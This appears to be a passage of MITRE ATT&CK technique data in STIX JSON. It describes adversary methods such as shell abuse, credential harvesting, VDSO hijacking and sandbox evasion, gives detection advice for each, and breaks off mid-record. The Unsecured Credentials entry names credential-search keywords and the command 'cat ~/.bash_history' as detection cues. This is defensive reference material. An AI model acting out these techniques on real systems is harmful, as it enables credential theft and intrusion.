    "{\"created\":\"2017-05-31T21:30:53.408Z\",\"external_references\":[{\"external_id\":\"T1065\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1065\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0\",\"modified\":\"2020-03-14T18:19:53.002Z\",\"name\":\"Uncommonly Used Port\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-09T14:15:05.330Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\\n\\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.\",\"external_references\":[{\"external_id\":\"T1059.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/004\"},{\"description\":\"die.net. (n.d.). bash(1) - Linux man page. Retrieved June 12, 2020.\",\"source_name\":\"DieNet Bash\",\"url\":\"https://linux.die.net/man/1/bash\"},{\"description\":\"Apple. (2020, January 28). Use zsh as the default shell on your Mac. Retrieved June 12, 2020.\",\"source_name\":\"Apple ZShell\",\"url\":\"https://support.apple.com/HT208050\"}],\"id\":\"attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-15T16:55:44.483Z\",\"name\":\"Unix Shell\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"root\"],\"x_mitre_platforms\":[\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-04T12:47:23.631Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).\",\"external_references\":[{\"external_id\":\"T1552\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552\"}],\"id\":\"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-06-17T14:25:38.461Z\",\"name\":\"Unsecured Credentials\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Windows Registry\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\\n\\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.\\n\\nMonitoring when the user\'s <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \\\"history\\\" instead of commands like <code>cat ~/.bash_history</code>.\\n\\nAdditionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-09-04T14:35:04.617Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\\n\\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\\n\\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.(Citation: AWS Region Service Table)\\n\\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)\",\"external_references\":[{\"external_id\":\"T1535\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1535\"},{\"description\":\"Amazon. (2019, October 22). Region Table. Retrieved October 22, 2019.\",\"source_name\":\"AWS Region Service Table\",\"url\":\"https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/\"},{\"description\":\"CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.\",\"source_name\":\"CloudSploit - Unused AWS Regions\",\"url\":\"https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc\"}],\"id\":\"attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2019-10-22T19:56:22.024Z\",\"name\":\"Unused/Unsupported Cloud Regions\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Netskope\"],\"x_mitre_data_sources\":[\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-30T16:18:36.873Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \\n\\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\\n\\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\\n\",\"external_references\":[{\"external_id\":\"T1550\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1550\"},{\"description\":\"NIST. (n.d.). Authentication. Retrieved January 30, 2020.\",\"source_name\":\"NIST Authentication\",\"url\":\"https://csrc.nist.gov/glossary/term/authentication\"},{\"description\":\"NIST. (n.d.). Multi-Factor Authentication (MFA). Retrieved January 30, 2020.\",\"source_name\":\"NIST MFA\",\"url\":\"https://csrc.nist.gov/glossary/term/Multi_Factor-Authentication\"},{\"description\":\"Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Audit Policy\",\"url\":\"https://technet.microsoft.com/en-us/library/dn487457.aspx\"}],\"id\":\"attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-24T12:36:24.608Z\",\"name\":\"Use Alternate Authentication Material\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"OAuth audit logs\",\"Authentication logs\"],\"x_mitre_defense_bypassed\":[\"System Access Controls\"],\"x_mitre_detection\":\"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-06T21:04:12.454Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) \",\"external_references\":[{\"external_id\":\"T1497.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1497/002\"},{\"description\":\"Keragala, D. (2016, January 16). Detecting Malware and Sandbox Evasion Techniques. Retrieved April 17, 2019.\",\"source_name\":\"Sans Virtual Jan 2016\",\"url\":\"https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667\"},{\"description\":\"Falcone, R., Lee, B.. (2018, November 20). Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan. Retrieved April 23, 2019.\",\"source_name\":\"Unit 42 Sofacy Nov 2018\",\"url\":\"https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/\"},{\"description\":\"Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.\",\"source_name\":\"FireEye FIN7 April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\"}],\"id\":\"attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-07-01T16:32:02.491Z\",\"name\":\"User Activity Based Checks\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Deloitte Threat Library Team\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process use of network\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Static File Analysis\",\"Signature-based detection\",\"Host forensic analysis\"],\"x_mitre_detection\":\"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary\'s implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\\n\\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user\'s desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\",\"external_references\":[{\"external_id\":\"T1204\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1204\"}],\"id\":\"attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-11T14:55:56.315Z\",\"name\":\"User Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Oleg Skulkin, Group-IB\"],\"x_mitre_data_sources\":[\"Anti-virus\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user\'s computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-01-14T01:35:00.781Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \\n\\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process\' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO) (Citation: VDSO Aug 2005) (Citation: Syscall 2014)\\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  \",\"external_references\":[{\"external_id\":\"T1055.014\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/014\"},{\"description\":\"O\'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved March 15, 2020.\",\"source_name\":\"ELF Injection May 2009\",\"url\":\"https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html\"},{\"description\":\"backtrace. (2016, April 22). ELF SHARED LIBRARY INJECTION FORENSICS. Retrieved June 15, 2020.\",\"source_name\":\"Backtrace VDSO\",\"url\":\"https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/\"},{\"description\":\"Petersson, J. (2005, August 14). What is linux-gate.so.1?. Retrieved June 16, 2020.\",\"source_name\":\"VDSO Aug 2005\",\"url\":\"https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/\"},{\"description\":\"Drysdale, D. (2014, July 16). Anatomy of a system call, part 2. Retrieved June 16, 2020.\",\"source_name\":\"Syscall 2014\",\"url\":\"https://lwn.net/Articles/604515/\"},{\"description\":\"Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.\",\"source_name\":\"ArtOfMemoryForensics\"},{\"description\":\"GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.\",\"source_name\":\"GNU Acct\",\"url\":\"https://www.gnu.org/software/acct/\"},{\"description\":\"Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.\",\"source_name\":\"RHEL auditd\",\"url\":\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\"},{\"description\":\"stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.\",\"source_name\":\"Chokepoint preload rootkits\",\"url\":\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\"}],\"id\":\"attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:28:45.232Z\",\"name\":\"VDSO Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"System calls\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes\' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:28:44.950Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.\\n\\nVNC is a desktop sharing system that allows users to remotely control another computer’s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.\",\"external_references\":[{\"external_id\":\"T1021.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/005\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"}],\"id\":\"attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T20:41:21.147Z\",\"name\":\"VNC\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process use of network\",\"Network protocol analysis\",\"Netflow/Enclave netflow\"],\"x_mitre_detection\":\"Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with VNC.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"VNC server installed and listening for connections.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:00.645Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\\n\\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)\",\"external_references\":[{\"external_id\":\"T1078\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1078\"},{\"external_id\":\"CAPEC-560\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/560.html\"},{\"description\":\"Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Credential Theft\",\"url\":\"https://technet.microsoft.com/en-us/library/dn535501.aspx\"},{\"description\":\"Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Audit Policy\",\"url\":\"https://technet.microsoft.com/en-us/library/dn487457.aspx\"}],\"id\":\"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-06-20T22:44:36.043Z\",\"name\":\"Valid Accounts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Netskope\",\"Mark Wee\",\"Praetorian\"],\"x_mitre_data_sources\":[\"AWS CloudTrail logs\",\"Stackdriver logs\",\"Authentication logs\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Firewall\",\"Host intrusion prevention systems\",\"Network intrusion detection system\",\"Application control\",\"System access controls\",\"Anti-virus\"],\"x_mitre_detection\":\"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\\n\\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\",\"x_mitre_effective_permissions\":[\"User\",\"Administrator\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"SaaS\",\"Office 365\",\"Azure AD\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:31:37.917Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary can leverage a computer\'s peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\\n\\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim\'s screen.\\n\\nIn macOS, there are a few different malware samples that record the user\'s webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)\",\"external_references\":[{\"external_id\":\"T1125\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1125\"},{\"external_id\":\"CAPEC-634\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/634.html\"},{\"description\":\"Patrick Wardle. (n.d.). Retrieved March 20, 2018.\",\"source_name\":\"objective-see 2017 review\",\"url\":\"https://objective-see.com/blog/blog_0x25.html\"}],\"id\":\"attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2019-07-17T21:14:04.412Z\",\"name\":\"Video Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\",\"API monitoring\"],\"x_mitre_detection\":\"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\\n\\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-17T22:22:24.505Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\\n\\n\",\"external_references\":[{\"external_id\":\"T1497\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1497\"},{\"description\":\"Falcone, R., Wartell, R.. (2015, July 27). UPS: Observations on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload. Retrieved April 23, 2019.\",\"source_name\":\"Unit 42 Pirpi July 